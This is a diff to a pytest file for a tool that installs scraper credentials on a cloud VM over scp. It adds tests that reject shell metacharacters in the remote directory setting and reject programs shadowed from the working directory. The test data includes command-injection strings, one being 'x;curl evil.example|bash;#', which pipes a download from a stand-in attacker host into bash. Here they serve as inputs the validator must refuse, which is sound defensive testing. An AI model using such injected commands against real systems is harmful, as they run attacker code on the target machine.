@@ -8,6 +8,8 @@ import sys
 import types
 from pathlib import Path
 
+import pytest
+
 REPO = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(REPO / "local"))
 
@@ -302,7 +304,7 @@ def test_set_secret_cmd_neutralises_the_old_inline_export():
 
 def test_valid_secret_values_are_accepted():
     # Shapes only, all three synthetic. Never paste a live credential here.
-    for good in ("11111111-2222-3333-4444-555555555555", "AQ.abc_123", "k1,k2,k3"):
+    for good in ("00000000-0000-4000-8000-000000000000", "AQ.abc_123", "k1,k2,k3"):
         assert vm_sync.valid_secret_value(good) is True
 
 
@@ -413,7 +415,8 @@ def _install(tmp_path, home, value, name="BRIGHT_DATA_API_TOKEN"):
     staged = home / vm_sync.SECRET_STAGE_REMOTE_FILE
     staged.write_text(value + "\n", newline="\n", encoding="utf-8")
     res = subprocess.run([bash, str(script)], env={**os.environ, "HOME": str(home)},
-                         capture_output=True, text=True, timeout=60)
+                         capture_output=True, text=True,
+                         encoding="utf-8", errors="replace", timeout=60)
     return res, staged
 
 
@@ -451,12 +454,13 @@ def test_the_remote_secret_script_actually_works_end_to_end(tmp_path):
         [bash, "-c", 'source "$HOME/run_scraper.sh" >/dev/null; '
                      'echo "$BRIGHT_DATA_API_TOKEN|$BRIGHT_DATA_DATASET_ID"'],
         env={**os.environ, "HOME": str(home)},
-        capture_output=True, text=True, timeout=60).stdout.strip()
+        capture_output=True, text=True,
+        encoding="utf-8", errors="replace", timeout=60).stdout.strip()
     assert out == "second-value-222|gd_keepme"
 
 
 def test_an_indented_inline_export_is_neutralised_not_left_to_win(tmp_path):
-    """The sed used to be anchored at column 0, so `  export NAME=old` survived.
+    """A sed anchored at column 0 leaves `  export NAME=old` alive.
 
     That is the worst outcome this feature has: the script exits 0, the panel says
     "set on the VM", and the cron run keeps using the dead credential, because the
@@ -475,7 +479,8 @@ def test_an_indented_inline_export_is_neutralised_not_left_to_win(tmp_path):
         [bash, "-c", 'source "$HOME/run_scraper.sh" >/dev/null; '
                      'printf %s "$BRIGHT_DATA_API_TOKEN"'],
         env={**os.environ, "HOME": str(home)},
-        capture_output=True, text=True, timeout=60).stdout.strip()
+        capture_output=True, text=True,
+        encoding="utf-8", errors="replace", timeout=60).stdout.strip()
     assert out == "new-value-333", "the indented dead export still won"
 
 
@@ -547,9 +552,9 @@ def test_a_non_home_remote_dir_is_refused_before_anything_is_uploaded(tmp_path):
 
 
 def test_an_unmanaged_name_is_refused_before_the_value_is_uploaded(monkeypatch):
-    """The name check used to live in set_secret_cmd, which runs only AFTER the
-    scp: a rejected name still put the plaintext credential on the VM, with no
-    EXIT trap ever armed to remove it."""
+    """set_secret_cmd runs only AFTER the scp, so a name check there would let a
+    rejected name put the plaintext credential on the VM anyway, with no EXIT trap
+    ever armed to remove it. The check belongs before the upload."""
     import pytest
     calls = []
     monkeypatch.setattr(vm_sync, "run_cmd", lambda cmd: calls.append(cmd) or
@@ -738,3 +743,62 @@ def test_leftover_staging_dirs_reports_what_the_finally_could_not_delete(tmp_pat
     (tmp_path / "unrelated-dir").mkdir()
     found = vm_sync.leftover_staging_dirs()
     assert [d.name for d in found] == ["inployed-secret-abc"]
+
+
+# --- VM_REMOTE_DIR reaches the VM's shell, so it is validated ------------------
+
+def test_valid_remote_dir_accepts_a_plain_path_and_the_home_spellings():
+    for good in ("", "~", ".", "/opt/scraper", "scraper", "~/inployed",
+                 "/opt/my-scraper_1.0/"):
+        assert vm_sync.valid_remote_dir(good), good
+
+
+def test_valid_remote_dir_refuses_shell_metacharacters():
+    """An scp REMOTE path is transported as `scp -t <path>` through the VM's
+    login shell (both OpenSSH scp and the pscp.exe gcloud drives on Windows), so
+    it is a shell word there, not an opaque argument."""
+    for bad in ("x;id", "x`id`", "x$(id)", "x|id", "x&id", "a b", "x>out",
+                "x'y", 'x"y', "x" + chr(10) + "y", "x*", "$HOME"):
+        assert not vm_sync.valid_remote_dir(bad), bad
+
+
+def test_every_scp_flow_refuses_a_hostile_remote_dir():
+    """The guard sits in build_scp_cmd, the one place all four scp flows go
+    through -- the credential install had its own check (_require_home_remote_dir)
+    and the other four pushes had none, on the strength of a docstring claiming
+    remote_dir stays in argv where it is data."""
+    t = vm_sync.VMTarget(gcloud="gcloud", instance="vm", zone="z", project="p",
+                         user="u", remote_dir="x;curl evil.example|bash;#")
+    for call in (lambda: t.build_scp_cmd("local.txt", "remote.txt"),
+                 lambda: t.push_exclude_ids_cmd("local.txt")):
+        with pytest.raises(ValueError) as exc:
+            call()
+        assert "VM_REMOTE_DIR" in str(exc.value)
+
+
+def test_a_plain_remote_dir_still_builds_the_same_argv():
+    t = vm_sync.VMTarget(gcloud="gcloud", instance="vm", zone="z", project="",
+                         user="u", remote_dir="/opt/scraper")
+    assert "u@vm:/opt/scraper/b.txt" in t.build_scp_cmd("a.txt", "b.txt")
+
+
+# --- the cwd-shadow rule covers BOTH lookups on the launch path ---------------
+
+def test_reject_cwd_shadow_refuses_a_program_in_the_working_directory(tmp_path,
+                                                                     monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    shadow = tmp_path / "python.exe"
+    shadow.write_text("", encoding="utf-8")
+    with pytest.raises(RuntimeError) as exc:
+        vm_sync._reject_cwd_shadow("python", str(shadow))
+    assert "working directory" in str(exc.value)
+
+
+def test_reject_cwd_shadow_passes_a_program_from_elsewhere(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    elsewhere = tmp_path / "sub"
+    elsewhere.mkdir()
+    real = elsewhere / "python.exe"
+    real.write_text("", encoding="utf-8")
+    assert vm_sync._reject_cwd_shadow("python", str(real)) == str(real)
+    assert vm_sync._reject_cwd_shadow("python", None) is None
